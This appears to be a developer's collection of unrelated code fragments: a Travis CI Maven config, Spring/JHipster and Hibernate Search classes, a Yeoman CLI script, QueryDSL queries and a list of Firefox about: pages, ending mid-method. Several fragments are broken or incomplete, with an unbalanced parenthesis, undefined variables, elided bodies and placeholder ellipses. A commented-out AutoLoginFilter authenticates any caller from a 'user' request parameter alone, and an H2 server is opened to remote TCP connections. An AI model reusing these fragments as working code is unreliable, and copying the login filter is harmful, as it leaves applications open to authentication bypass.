before_install:
  # Build options must be set before install, so that we properly retrieve *all* the necessary dependencies
  - BUILD_OPTIONS='-Pdist -Pcoverage -Pjqassistant'
install:
  # The Maven install provided by Travis is outdated, use Maven wrapper to get the latest version
  - mvn -N io.takari:maven:wrapper
  - ./mvnw -v
  # First run to download most Maven dependencies without logging and to install our artifacts for the early checkstyle execution
  # We want to start as many plugins as possible (so that their dependencies are downloaded),
  # but we want the plugins to be skipped if they are not essential,
  # because they will be re-executed later and we don't want to waste time.
  - ./mvnw $BUILD_OPTIONS -B -q clean install javadoc:javadoc
    -DskipTests -Dmaven.javadoc.skip=true -Dcheckstyle.skip=true -Dforbiddenapis.skip=true -Djqassistant.skip=true
script:
  # We run checks first to fail fast if there is a styling error, then we run the actual build.
  - ./mvnw $BUILD_OPTIONS checkstyle:check
    && ./mvnw $BUILD_OPTIONS install javadoc:javadoc -Dcheckstyle.skip
before_cache:
  # Do not put the artifacts we just built into the cache
  - rm -r $HOME/.m2/repository/org/hibernate/search/
  - rm -r $HOME/.m2/repository/org/hibernate/hibernate-search*
--------------------------------------------------------------------------------------------------------
import java.util.List;
 
import org.apache.lucene.analysis.standard.StandardAnalyzer;
import org.apache.lucene.queryParser.MultiFieldQueryParser;
import org.apache.lucene.queryParser.ParseException;
import org.apache.lucene.search.Query;
import org.hibernate.Session;
import org.hibernate.Transaction;
import org.hibernate.search.FullTextSession;
import org.hibernate.search.Search;
 
import com.fric.noc.model.User;
import com.fric.noc.utils.HibernateUtil;
 
public class UserDAOImpl implements UserDAO {
 
	@Override
	public List<User> search() {
		Session session;
		List<User> users = null;
		try {
			session = HibernateUtil.getSessionFactory().openSession();
			FullTextSession fullTextSession = Search
					.createFullTextSession(session);
			Transaction transaction = fullTextSession.beginTransaction();
			String[] fields = new String[] { "firstName", "patronymic",
					"lastName", "sex", "phone", "email", "country", "region",
					"city", "address", "other" };
			MultiFieldQueryParser parser = new MultiFieldQueryParser(fields,
					new StandardAnalyzer());
			Query queryLucene = parser.parse("Stas");
			org.hibernate.Query queryHibernate = fullTextSession
					.createFullTextQuery(queryLucene, User.class);
			users = queryHibernate.list();
			transaction.commit();
			session.close();
		} catch (ParseException e) {
			e.printStackTrace();
		}
		return users;
	}
 
}
--------------------------------------------------------------------------------------------------------
import com.springio.store.aop.logging.LoggingAspect;

import io.github.jhipster.config.JHipsterConstants;

import org.springframework.context.annotation.*;
import org.springframework.core.env.Environment;

@Configuration
@EnableAspectJAutoProxy
public class LoggingAspectConfiguration {

    @Bean
    @Profile(JHipsterConstants.SPRING_PROFILE_DEVELOPMENT)
    public LoggingAspect loggingAspect(Environment env) {
        return new LoggingAspect(env);
    }
}
--------------------------------------------------------------------------------------------------------

import io.github.jhipster.config.JHipsterConstants;
import io.github.jhipster.config.liquibase.AsyncSpringLiquibase;

import com.fasterxml.jackson.datatype.hibernate5.Hibernate5Module;
import liquibase.integration.spring.SpringLiquibase;
import org.h2.tools.Server;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.boot.autoconfigure.liquibase.LiquibaseProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Profile;
import org.springframework.core.env.Environment;
import org.springframework.data.elasticsearch.repository.config.EnableElasticsearchRepositories;
import org.springframework.core.task.TaskExecutor;
import org.springframework.data.jpa.repository.config.EnableJpaAuditing;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.transaction.annotation.EnableTransactionManagement;

import javax.sql.DataSource;
import java.sql.SQLException;

@Configuration
@EnableJpaRepositories("com.springio.store.repository")
@EnableJpaAuditing(auditorAwareRef = "springSecurityAuditorAware")
@EnableTransactionManagement
@EnableElasticsearchRepositories("com.springio.store.repository.search")
public class DatabaseConfiguration {

    private final Logger log = LoggerFactory.getLogger(DatabaseConfiguration.class);

    private final Environment env;

    public DatabaseConfiguration(Environment env) {
        this.env = env;
    }

    /**
     * Open the TCP port for the H2 database, so it is available remotely.
     *
     * @return the H2 database TCP server
     * @throws SQLException if the server failed to start
     */
    @Bean(initMethod = "start", destroyMethod = "stop")
    @Profile(JHipsterConstants.SPRING_PROFILE_DEVELOPMENT)
    public Server h2TCPServer() throws SQLException {
        return Server.createTcpServer("-tcp","-tcpAllowOthers");
    }

    @Bean
    public SpringLiquibase liquibase(@Qualifier("taskExecutor") TaskExecutor taskExecutor,
            DataSource dataSource, LiquibaseProperties liquibaseProperties) {

        // Use liquibase.integration.spring.SpringLiquibase if you don't want Liquibase to start asynchronously
        SpringLiquibase liquibase = new AsyncSpringLiquibase(taskExecutor, env);
        liquibase.setDataSource(dataSource);
        liquibase.setChangeLog("classpath:config/liquibase/master.xml");
        liquibase.setContexts(liquibaseProperties.getContexts());
        liquibase.setDefaultSchema(liquibaseProperties.getDefaultSchema());
        liquibase.setDropFirst(liquibaseProperties.isDropFirst());
        if (env.acceptsProfiles(JHipsterConstants.SPRING_PROFILE_NO_LIQUIBASE)) {
            liquibase.setShouldRun(false);
        } else {
            liquibase.setShouldRun(liquibaseProperties.isEnabled());
            log.debug("Configuring Liquibase");
        }
        return liquibase;
    }

    @Bean
    public Hibernate5Module hibernate5Module() {
        return new Hibernate5Module();
    }
}

https://www.programcreek.com/java-api-examples/?code=deepu105%2Fspring-io%2Fspring-io-master%2Fspring-io%2Fsrc%2Fmain%2Fjava%2Fcom%2Fspringio%2Fstore%2Fweb%2Frest%2FUserResource.java#
--------------------------------------------------------------------------------------------------------
public class MyModel {

    @NumberFormat(style=Style.CURRENCY)
    private BigDecimal decimal;
}

public class MyModel {

    @DateTimeFormat(iso=ISO.DATE)
    private Date date;
}
--------------------------------------------------------------------------------------------------------
@Configuration
public class AppConfig {

    @Bean
    public FormattingConversionService conversionService() {

        // Use the DefaultFormattingConversionService but do not register defaults
        DefaultFormattingConversionService conversionService = new DefaultFormattingConversionService(false);

        // Ensure @NumberFormat is still supported
        conversionService.addFormatterForFieldAnnotation(new NumberFormatAnnotationFormatterFactory());

        // Register date conversion with a specific global format
        DateFormatterRegistrar registrar = new DateFormatterRegistrar();
        registrar.setFormatter(new DateFormatter("yyyyMMdd"));
        registrar.registerFormatters(conversionService);

        return conversionService;
    }
}
--------------------------------------------------------------------------------------------------------
var path = require('path');

 

 

module.exports = {debugFunction: debug}

var prompts = require('./prompts');

process.stdin.setEncoding('utf8');

 

function parseArgs(args) {

  if (!args || args.length === 0) {

    console.log('Possible options:');

    console.log('--generatorName NAME - name with namespace of the generator (Required)');

    console.log('--generatorPath PATH - path to generator folder');

    console.log('--yeoman PATH - path to yeoman nodejs package');

    console.log('--plain - by default output uses json format. If you want to use plain string specify the parameter');

    console.log('--arguments - generator arguments');

    console.log('--noskipinstall - do not pass skip install argument');

    console.log('--debug - debug output');

    console.log('--newYoVersion - use new (Promise) Yeoman API');

    console.log(

        'example :node lib/cli.js --generatorName angular-fullstack --yeoman /usr/local/lib/node_modules/yo --plain --debug --newYoVersion\n')

    process.exit(0);

  }

 

 

  var options = {}

 

  for (var i = 0; i < args.length; i++) {

    switch (args[i]) {

      case "--generatorPath": {

        options.generatorPath = (++i < args.length) ? args[i] : null;

        break;

      }

      case "--generatorName": {

        options.generatorName = (++i < args.length) ? args[i] : null;

        break;

      }

      case "--yeoman": {

        options.yeoman = (++i < args.length) ? args[i] : null;

        break;

      }

      case "--arguments": {

        options.arguments = (++i < args.length) ? args[i] : null;

        break;

      }

      case "--plain": {

        options.plain = true;

        break;

      }

      case "--noskipinstall": {

        options.noskipinstall = true;

        break;

      }

      case "--debug": {

        options.debug = true;

        break;

      }

      case "--newYoVersion": {

        options.newYoVersion = true;

        break;

      }

      default: //do nothing

    }

  }

 

  return options;

}

 

var options = parseArgs(process.argv.slice(2));

 

var debugSupport = options.debug ? true : false;

 

if (options.arguments && !options.noskipinstall) {

  options.arguments = options.arguments.trim() + " --skip-install";

}

 

 

var optionsForRun = {};

if (options.arguments) {

  var argsForGenerator = options.arguments.split(' ');

  for (var i = 0; i < argsForGenerator.length; i++) {

    var value = argsForGenerator[i];

    if (value.indexOf('--') === 0) {

      var nextIndex = i + 1;

      var keyDefault = value.substring(2);

      var key = camelCase(keyDefault);

      if (nextIndex < argsForGenerator.length && argsForGenerator[nextIndex].indexOf('--') === -1) {

        optionsForRun[key] = argsForGenerator[++i];

      }

      else {

        optionsForRun[key] = true;

      }

      optionsForRun[keyDefault] = optionsForRun[key];

    }

  }

}

else if (!options.noskipinstall) {

  optionsForRun['skipInstall'] = true;

  optionsForRun['skip-install'] = true;

}

 

debug('options for generator ' + JSON.stringify(optionsForRun));

 

var prefix = (options.yeoman ? options.yeoman + path.sep + 'node_modules' + path.sep : '');

var inquirer = require(prefix + 'inquirer');

var yeomanEnv = require(prefix + 'yeoman-environment');

 

 

var env = yeomanEnv.createEnv(null, optionsForRun, new Adapter);

 

var wasDone = false;

 

 

var callbackDone = function () {

  debug("DONE<> as generator")

  wasDone = true;

  setWaitingNextInput();

}

 

 

var cwd = process.cwd();

 

var args = options.generatorName;

if (options.generatorPath) {

  process.chdir(options.generatorPath);

  env.lookup(function () {

    process.chdir(cwd);

    runGenerator();

  });

}

else if (options.generatorName) {

  env.lookup(function () {

    runGenerator();

  });

}

else {

  throw new Error("You should specify generatorName");

}

 

function runGenerator() {

  debug('invoke run');

  env.run(args, optionsForRun, callbackDone);

}

 

/**

* @constructor

*/

function Adapter() {

  debug('adapter create');

 

 

  this.promptModule = inquirer.createPromptModule();

 

  Object.keys(this.promptModule.prompts).forEach(function (name) {

    this.promptModule.registerPrompt(name, Prompt.bind(null, prompts.handlers[name] || prompts.defaultHandler));

  }, this);

  ;

 

 

  if (options.newYoVersion) {

    this.prompt = (function (questions, cb) {

      const promise = this.promptModule(questions);

      promise.then(function () {

 

        if (cb) {

          debug("Run original callback for " + (arguments.length > 0 ? arguments[0] : ""));

          cb.apply(null, arguments);

        }

      });

      return promise;

    }).bind(this);

  }

  else {

    this.prompt = this.promptModule;

  }

 

  this.log = yeomanEnv.util.log();

 

}

 

 

/**

* @constructor

*/

function Prompt(getResultFunction, question, rl, answers) {

  this.question = question;

  this.rl = rl;

  this.answers = answers;

 

  this._run = function (callback) {

    printMessage(question);

 

    waitingInput = true;

 

    var listener = function (line) {

      var resultFunction = getResultFunction(question, line);

      callback(resultFunction);

      rl.removeListener('line', listener);

 

      if (wasDone) {

        setWaitingNextInput();

      }

      waitingInput = false;

    };

 

    rl.on('line', listener);

 

    return this;

  }

 

  if (options.newYoVersion) {

    this.run = function () {

      return new Promise(function (resolve) {

        this._run(function (callback) {

          debug("resolve called");

          return resolve(callback)

        })

      }.bind(this));

    }

  }

  else {

    this.run = this._run;

  }

 

 

  return this;

}

 

 

function printMessage(questionWithAnswers) {

  if (options.plain) {

    //print plain text

    process.stdout.write(questionWithAnswers.message + '\n');

    if (questionWithAnswers.choices) {

      var index = 0;

      questionWithAnswers.choices.forEach(function (v) {

        if (typeof v === 'string') {

          process.stdout.write('' + (index++) + ' ' + v + '\n')

        }

        else {

          process.stdout.write('' + (index++) + ' ' + (v.name || v.value || v.message) + (v.checked ? ' x' : '') + '\n');

        }

      });

    }

  }

  else {

    var stringAnswers = JSON.stringify(questionWithAnswers);

    process.stdout.write(stringAnswers + '\n');

  }

}

 

 

function debug(v) {

  if (debugSupport) console.log('--debug ' + v);

}

 

function camelCase(str) {

  str = str.trim();

 

  if (str.length === 1 || !(/[_.\- ]+/).test(str)) {

    if (str[0] === str[0].toLowerCase() && str.slice(1) !== str.slice(1).toLowerCase()) {

      return str;

    }

 

    return str.toLowerCase();

  }

 

  return str

      .replace(/^[_.\- ]+/, '')

      .toLowerCase()

      .replace(/[_.\- ]+(\w|$)/g, function (m, p1) {

        return p1.toUpperCase();

      });

}

 

 

//magic hack for shutdown the process

var waitingInput = false;

var timeout = null;

 

function setWaitingNextInput() {

  if (timeout !== null) {

    clearTimeout(timeout);

  }

  timeout = setTimeout(function () {

    timeout = null;

    waiting = false;

    if (!waitingInput) {

      process.stdin.destroy();

    }

  }, 500);

}
--------------------------------------------------------------------------------------------------------
about:about	Provides an overview of all about: pages available for your current Firefox version
about:addons	Add-ons Manager
about:buildconfig	Displays the configuration and platform used to build Firefox
about:cache	Displays information about the memory, disk, and appcache
about:checkerboard	Switches to the checkerboarding measurement page, which allows to detect checkerboarding issues
about:config	Provides a way to inspect and change Firefox preferences and settings
about:compat	Lists overriding site compatability fixes, linked to specific bug issues.
about:crashes	Lists all crashes, which happened during the runtime of Firefox (in case the user enabled the crash reporter)
about:credits	Lists all contributors to the Firefox project
about:debugging	Switches to the Developer Tools debugging page, which allows you to debug add-ons, tabs and Service Workers
about:devtools	Summarizes the developer tools and provides links to documentation for each tool
about:downloads	Displays all downloads done within Firefox
about:home	Start page of Firefox when opening a new window
about:license	Displays licensing information
about:logo	Firefox logo
about:memory	Provides a way to display memory usage, save it as report and run the GC and CC
about:mozilla	Special page showing a message from "The Book of Mozilla"
about:networking	Displays networking information
about:newtab	Start page when opening a new tab
about:performance	Displays memory and performance information about Firefox subprocesses/add-ons/tabs
about:plugins	Displays information about installed plugins
about:policies	Lists out the Firefox for Enterprise policies
about:preferences	Firefox settings (also available through Firefox menu > Options)
about:privatebrowsing	Start page when opening a private window
about:profiles	Display and manage Firefox profiles
about:restartrequired	A page users are sent to when Firefox requires a restart due to an update
about:reader	Indicates a web page has Firefox Reader View turned on. See Firefox Reader View for clutter-free web pages
about:rights	Displays rights information
about:robots	Special page showing notes about robots
about:serviceworkers	Displays currently running Service Workers
about:studies	Lists the Shield Studies that are installed
about:sessionrestore	Session restoration (displayed after a Firefox crash)
about:support	Troubleshooting information (also available through Firefox menu > ? (question mark) > Troubleshooting Information)
about:sync-log	Displays a synchronization protocol related to the Sync feature
about:telemetry	Displays telemetry data collected and sent to Mozilla while Firefox is running (in case the user enabled telemetry)
about:url-classifier	Displays the status of the URL Classifier services that Firefox uses (for example for Safe Browsing)
about:webrtc	Information about WebRTC usage
about:welcome	Page first displayed when Firefox is installed
about:welcomeback	Information page displayed after Firefox is reset
--------------------------------------------------------------------------------------------------------
/*
@EnableWebMvc
@Configuration
@ComponentScan({ "com.baeldung.web" })
public class WebConfig implements WebMvcConfigurer {

    @Override
    public void configureMessageConverters(
      List<HttpMessageConverter<?>> converters) {

        messageConverters.add(createXmlHttpMessageConverter());
        messageConverters.add(new MappingJackson2HttpMessageConverter());
    }
    private HttpMessageConverter<Object> createXmlHttpMessageConverter() {
        MarshallingHttpMessageConverter xmlConverter =
          new MarshallingHttpMessageConverter();

        XStreamMarshaller xstreamMarshaller = new XStreamMarshaller();
        xmlConverter.setMarshaller(xstreamMarshaller);
        xmlConverter.setUnmarshaller(xstreamMarshaller);

        return xmlConverter;
    }
}
 */
--------------------------------------------------------------------------------------------------------
/**
 * Event model entity
 */
@Data
@EqualsAndHashCode
@ToString
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, property = "event")
@JsonSubTypes({
    @JsonSubTypes.Type(value = RankEvent.class, name = "rank"),
    @JsonSubTypes.Type(value = GenerateEvent.class, name = "generate")
})
public class Event {

    /**
     * Default task identifier
     */
    private Long id;
    /**
     * Task name
     */
    private String name;
}
--------------------------------------------------------------------------------------------------------
@ConfigurationProperties("app.acme")
public class AcmeProperties {

	private String name;

	public String getName() { ... }

	public void setName(String name) { ... }

	@DeprecatedConfigurationProperty(replacement = "app.acme.name")
	@Deprecated
	public String getTarget() {
		return getName();
	}

	@Deprecated
	public void setTarget(String target) {
		setName(target);
	}
}

org.apache.kafka.common.serialization.Serdes.StringSerde
--------------------------------------------------------------------------------------------------------
//import org.springframework.beans.factory.annotation.Autowired;
//import org.springframework.security.authentication.AuthenticationManager;
//import org.springframework.security.web.authentication.preauth.AbstractPreAuthenticatedProcessingFilter;
//import org.springframework.stereotype.Component;
//import org.springframework.util.StringUtils;
//
//import javax.servlet.FilterChain;
//import javax.servlet.ServletException;
//import javax.servlet.ServletRequest;
//import javax.servlet.ServletResponse;
//import javax.servlet.http.HttpServletRequest;
//import java.io.IOException;
//
///**
// *
// * AutoLogin Filter implementation
// *
// * @author Alex
// * @version 1.0.0
// * @since 2017-08-08
// */
//@Component("commonAutoLoginFilter")
//public class AutoLoginFilter extends AbstractPreAuthenticatedProcessingFilter {
//
//    private AuthenticationManager authenticationManagerBean;
//
//    @Autowired
//    @Override
//    public void setAuthenticationManager(AuthenticationManager authenticationManagerBean) {
//        super.setAuthenticationManager(authenticationManagerBean);
//        this.authenticationManagerBean = authenticationManagerBean;
//    }
//
//    public AuthenticationManager getAuthenticationManager() {
//        return authenticationManagerBean;
//    }
//
//    @Override
//    public void doFilter(final ServletRequest request, final ServletResponse response, final FilterChain chain) throws IOException, ServletException {
//        chain.doFilter(request, response);
//    }
//
//    @Override
//    protected Object getPreAuthenticatedPrincipal(final HttpServletRequest request) {
//        System.out.println("getPreAuthenticatedCredentials: " + request.getRequestURI());
//        String user = request.getParameter("user");
//        if (StringUtils.hasLength(user)) {
//            return user;
//        } else {
//            return null;
//        }
//    }
//
//    @Override
//    protected Object getPreAuthenticatedCredentials(final HttpServletRequest request) {
//        String user = request.getParameter("user");
//        if (StringUtils.hasLength(user)) {
//            return "USER";
//        } else {
//            return null;
//        }
//    }
//}
--------------------------------------------------------------------------------------------------------
//@Component
//public class SwaggerWebFilter implements WebFilter {
//    @Override
//    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
//        ServerHttpRequest request = exchange.getRequest();
//        String path = request.getPath().pathWithinApplication().value();
//        if (path.startsWith("/api/swagger-ui.html") || path.startsWith("/api/webjars")
//                || path.startsWith("/api/api-docs") || path.startsWith("/api/configuration")
//                || path.startsWith("/api/swagger-resources") || path.startsWith("/api/v2"))) {
//            exchange = exchange.mutate().request(request.mutate().path(path.substring(4)).build()).build();
//        }
//        return chain.filter(exchange);
//    }
//}

--------------------------------------------------------------------------------------------------------
//    /**
//     * Returns {@link BeanFactoryPostProcessor} instance
//     *
//     * @return {@link BeanFactoryPostProcessor} instance
//     */
//    @Bean
//    @ConditionalOnMissingBean
//    @ConditionalOnClass(EnumAutowiringBeanFactoryPostProcessor.class)
//    @Description("Kafka enum autowiring factory bean")
//    public BeanFactoryPostProcessor postProcessor() {
//        return new EnumAutowiringBeanFactoryPostProcessor(
//            KafkaConsumerAutoOffsetResetType.class,
//            KafkaProducerAcknowledgementType.class,
//            KafkaProducerCompressionType.class
//        );
//    }

 
--------------------------------------------------------------------------------------------------------
spring.devtools.restart.trigger-file=.reloadtrigger
import org.axonframework.extensions.kafka.eventhandling.DefaultKafkaMessageConverter;
//import org.axonframework.extensions.kafka.eventhandling.KafkaMessageConverter;
https://github.com/AxonFramework/extension-kafka/tree/master/kafka


spring.devtools.restart.poll-interval=2s
spring.devtools.restart.quiet-period=1s
--------------------------------------------------------------------------------------------------------
public final class NumberFormatAnnotationFormatterFactory
        implements AnnotationFormatterFactory<NumberFormat> {

    public Set<Class<?>> getFieldTypes() {
        return new HashSet<Class<?>>(asList(new Class<?>[] {
            Short.class, Integer.class, Long.class, Float.class,
            Double.class, BigDecimal.class, BigInteger.class }));
    }

    public Printer<Number> getPrinter(NumberFormat annotation, Class<?> fieldType) {
        return configureFormatterFrom(annotation, fieldType);
    }

    public Parser<Number> getParser(NumberFormat annotation, Class<?> fieldType) {
        return configureFormatterFrom(annotation, fieldType);
    }

    private Formatter<Number> configureFormatterFrom(NumberFormat annotation, Class<?> fieldType) {
        if (!annotation.pattern().isEmpty()) {
            return new NumberStyleFormatter(annotation.pattern());
        } else {
            Style style = annotation.style();
            if (style == Style.PERCENT) {
                return new PercentStyleFormatter();
            } else if (style == Style.CURRENCY) {
                return new CurrencyStyleFormatter();
            } else {
                return new NumberStyleFormatter();
            }
        }
    }
}
--------------------------------------------------------------------------------------------------------
DefaultConversionService cs = new DefaultConversionService();

List<Integer> input = ....
cs.convert(input,
    TypeDescriptor.forObject(input), // List<Integer> type descriptor
    TypeDescriptor.collection(List.class, TypeDescriptor.valueOf(String.class)));
--------------------------------------------------------------------------------------------------------
import org.springframework.context.annotation.Configuration;
import org.springframework.format.FormatterRegistry;
import org.springframework.format.datetime.standard.DateTimeFormatterRegistrar;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;

@Configuration
public class DateTimeFormatConfiguration extends WebMvcConfigurerAdapter {

    @Override
    public void addFormatters(FormatterRegistry registry) {
        DateTimeFormatterRegistrar registrar = new DateTimeFormatterRegistrar();
        registrar.setUseIsoFormat(true);
        registrar.registerFormatters(registry);
    }
}

            objectMapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);
            objectMapper.configure(DeserializationFeature.ACCEPT_SINGLE_VALUE_AS_ARRAY, true);
--------------------------------------------------------------------------------------------------------
@EntityGraph(attributePaths = "authorities")
The Class-Path manifest attribute in C:\Users\rogalski\.m2\repository\org\glassfish\jaxb\jaxb-runtime\2.3.1\jaxb-runtime-2.3.1.jar referenced one or more files that do not exist: file:/C:/Users/rogalski/.m2/repository/org/glassfish/jaxb/jaxb-runtime/2.3.1/jaxb-api-2.3.1.jar,file:/C:/Users/rogalski/.m2/repository/org/glassfish/jaxb/jaxb-runtime/2.3.1/txw2-2.3.1.jar,file:/C:/Users/rogalski/.m2/repository/org/glassfish/jaxb/jaxb-runtime/2.3.1/istack-commons-runtime-3.0.7.jar,file:/C:/Users/rogalski/.m2/repository/org/glassfish/jaxb/jaxb-runtime/2.3.1/stax-ex-1.8.jar,file:/C:/Users/rogalski/.m2/repository/org/glassfish/jaxb/jaxb-runtime/2.3.1/FastInfoset-1.2.15.jar,file:/C:/Users/rogalski/.m2/repository/org/glassfish/jaxb/jaxb-runtime/2.3.1/javax.activation-api-1.2.0.jar
--------------------------------------------------------------------------------------------------------
/**
 * Mapper for the entity User and its DTO UserDTO.
 */
@Mapper(componentModel = "spring", uses = {})
public interface UserMapper {

    UserDTO userToUserDTO(User user);

    List<UserDTO> usersToUserDTOs(List<User> users);

    @Mapping(target = "createdBy", ignore = true)
    @Mapping(target = "createdDate", ignore = true)
    @Mapping(target = "lastModifiedBy", ignore = true)
    @Mapping(target = "lastModifiedDate", ignore = true)
    @Mapping(target = "activationKey", ignore = true)
    @Mapping(target = "resetKey", ignore = true)
    @Mapping(target = "resetDate", ignore = true)
    @Mapping(target = "password", ignore = true)
    User userDTOToUser(UserDTO userDTO);
--------------------------------------------------------------------------------------------------------
import org.springframework.security.config.annotation.SecurityConfigurerAdapter;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.web.DefaultSecurityFilterChain;
import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;

public class JWTConfigurer extends SecurityConfigurerAdapter<DefaultSecurityFilterChain, HttpSecurity> {

    public static final String AUTHORIZATION_HEADER = "Authorization";

    public static final String AUTHORIZATION_TOKEN = "access_token";

    private TokenProvider tokenProvider;

    public JWTConfigurer(TokenProvider tokenProvider) {
        this.tokenProvider = tokenProvider;
    }

    @Override
    public void configure(HttpSecurity http) throws Exception {
        JWTFilter customFilter = new JWTFilter(tokenProvider);
        http.addFilterBefore(customFilter, UsernamePasswordAuthenticationFilter.class);
    }
}
--------------------------------------------------------------------------------------------------------
logging:
  level:
    root: WARN        
    org:
      springframework:
        security: DEBUG
        web: ERROR    
      hibernate: DEBUG        
      apache:
        commons:
          dbcp2: DEBUG  		  
--------------------------------------------------------------------------------------------------------
@XmlElement(name = "code", nillable = false, required = true, namespace = "com.jakubstas.swagger")
--------------------------------------------------------------------------------------------------------
queryFactory.query()
        .select(user.version().locales)
        .from(user)
        //.where(QVersionEntity.versionEntity.locales.contains())
        .limit(3)
        .fetch()
queryFactory.query()
        .select(user.version().locales)
        .from(user)
        .where(user.version.locales.contains(new LocaleInfoEntity("ru")))
        .limit(3)
        .fetch()
JPAQuery query = new JPAQuery(this.entityManager, EclipseLinkTemplates.DEFAULT);
queryFactory.selectFrom(user)
        .where(user.version().locales.any().in(new LocaleInfoEntity("ru")))
        .limit(1);

final JPAQueryFactory queryFactory = new JPAQueryFactory(HQLTemplates.DEFAULT, this.getEntityManager());
queryFactory.selectFrom(user)
        .where(user.version().locales.contains((new LocaleInfoEntity("ru"))))
        .limit(1).fetch()
		
	queryFactory.query()
        .select(QFileEntity.fileEntity.version().locales)
        .from(QFileEntity.fileEntity)
        .where(QFileEntity.fileEntity.version().product().sku.equalsIgnoreCase(searchParameters.getSku())
        .and(QFileEntity.fileEntity.version().locales.contains(new LocaleInfoEntity(searchParameters.getLocale())))
        .and(QFileEntity.fileEntity.fileInfo().filePlatform.eq(searchParameters.getPlatform()))).fetch()
queryFactory.query().select(user.version().locales).from(user).fetch()

query.from(interval).orderBy(interval.end.desc()).fetchFirst();
JPAQuery query = new JPAQuery(entityManager);
 query.from(qEntity).singleResult(qEntity.id.max());
QDepartment department = QDepartment.department;
QDepartment d = new QDepartment("d");
queryFactory.selectFrom(department)
    .where(department.size.eq(
        JPAExpressions.select(d.size.max()).from(d)))
     .fetch();
.where(playerScore.score.eq(JPAExpressions.select(playerScore2.score.max())
                            .from(playerScore2))
                            .where(playerScore2.playerId.eq(playerScore.playerId)))
--------------------------------------------------------------------------------------------------------
public interface MyUserRepository extends JpaRepository<MyUser, Long>, 
  QuerydslPredicateExecutor<MyUser>, QuerydslBinderCustomizer<QMyUser> {
    @Override
    default public void customize(
      QuerydslBindings bindings, QMyUser root) {
        bindings.bind(String.class)
          .first((SingleValueBinding<StringPath, String>) StringExpression::containsIgnoreCase);
        bindings.excluding(root.email);
      }
}
--------------------------------------------------------------------------------------------------------
@NoRepositoryBean
public interface ExCustomRepository<T extends AbstractEntity, P extends EntityPathBase<T>, ID extends Serializable>
        extends JpaRepository<T, ID>, QuerydslPredicateExecutor<T>, QuerydslBinderCustomizer<P> {

    @Override
    default void customize(QuerydslBindings bindings, P root) {
    }
}
--------------------------------------------------------------------------------------------------------
package com.paragon.microservices.distributor.service.impl;

import com.paragon.microservices.distributor.model.domain.ProductParameters;
import com.paragon.microservices.distributor.model.domain.VersionParameters;
import com.paragon.microservices.distributor.model.entity.*;
import com.paragon.microservices.distributor.repository.FileRepository;
import com.paragon.microservices.distributor.repository.VersionRepository;
import com.paragon.microservices.distributor.service.interfaces.ProductService;
import com.paragon.microservices.distributor.service.interfaces.VersionService;
import com.paragon.microservices.distributor.system.utils.ServiceUtils;
import com.querydsl.core.types.Predicate;
import lombok.*;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang3.StringUtils;
import org.hibernate.search.jpa.FullTextEntityManager;
import org.hibernate.search.jpa.FullTextQuery;
import org.hibernate.search.jpa.Search;
import org.hibernate.search.query.dsl.QueryBuilder;
import org.springframework.core.convert.ConversionService;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Isolation;
import org.springframework.transaction.annotation.Transactional;

import java.util.Objects;
import java.util.Optional;
import java.util.Set;
import java.util.UUID;

import static com.paragon.mailingcontour.commons.exception.ResourceNotFoundException.throwResourceNotFound;
import static com.paragon.microservices.distributor.exception.EmptyContentException.throwEmptyContent;
import static com.paragon.microservices.distributor.exception.InvalidFormatException.throwInvalidFormat;
import static com.paragon.microservices.distributor.exception.InvalidParameterException.throwInvalidParameter;
import static com.paragon.microservices.distributor.system.utils.ServiceUtils.DEFAULT_COMPLETABLE_ACTION;
import static com.paragon.microservices.distributor.system.utils.ServiceUtils.copyNonNullProperties;
import static java.util.Arrays.asList;

/**
 * {@link VersionService} implementation
 */
@Slf4j
@Service
@EqualsAndHashCode(callSuper = true)
@ToString(callSuper = true)
@Getter(AccessLevel.PROTECTED)
@RequiredArgsConstructor
public class VersionServiceImpl extends AuditServiceImpl<VersionEntity, QVersionEntity, UUID> implements VersionService {
    /**
     * Default version format error messages
     */
    public static final String ERROR_VERSION_FORMAT_INVALID_MESSAGE_TEMPLATE = "error.version.format.invalid";

    private final VersionRepository versionRepository;
    private final ProductService productService;
    private final ConversionService conversionService;
    private final FileRepository fileRepository;

    @Override
    public Optional<VersionEntity> getVersionRecord(final VersionParameters versionParameters) {
        log.info("Fetching version record by input parameters: {}", versionParameters);
        return this.getRepository().findByIdAndProductId(versionParameters.getVersionId(), versionParameters.getProductId());
    }

    @Override
    public <S extends VersionEntity> Iterable<S> getAllVersionRecords(final ProductParameters productParameters) {
        log.info("Fetching all version records by input parameters: {}", productParameters);
        return this.getRepository().<S>findAllByProductId(productParameters.getProductId())
                .thenApply(ServiceUtils::ofEmpty)
                .whenCompleteAsync(DEFAULT_COMPLETABLE_ACTION, this.getAsyncTaskExecutor())
                .join()
                .orElseThrow(() -> throwEmptyContent(this.getMessageSource()));
    }

    @Override
    @Transactional(isolation = Isolation.READ_COMMITTED)
    public VersionEntity createVersionRecord(final ProductParameters productParameters, final VersionEntity versionEntity) {
        log.info("Creating new version record by input parameters: {}, versionEntity: {}", productParameters, versionEntity);
        return this.getProductService().findById(productParameters.getProductId())
                .map(entity -> {
                    versionEntity.setProduct(entity);
                    Optional.ofNullable(versionEntity.getFiles()).ifPresent(v -> v.forEach(fileEntity -> fileEntity.setVersion(versionEntity)));
                    return versionEntity;
                })
                .map(this::save)
                .orElseThrow(() -> throwResourceNotFound(this.getMessageSource(), ERROR_RESOURCE_NOT_FOUND, productParameters));
    }

    @Override
    @Transactional(isolation = Isolation.READ_COMMITTED)
    public VersionEntity updateVersionRecord(final VersionParameters versionParameters, final VersionEntity versionEntity) {
        log.info("Updating version record by input parameters: {}, entity: {}", versionParameters, versionEntity);
        return this.getVersionRecord(versionParameters)
                .map(entity -> {
                    copyNonNullProperties(versionEntity, entity);
                    return entity;
                })
                .map(this::save)
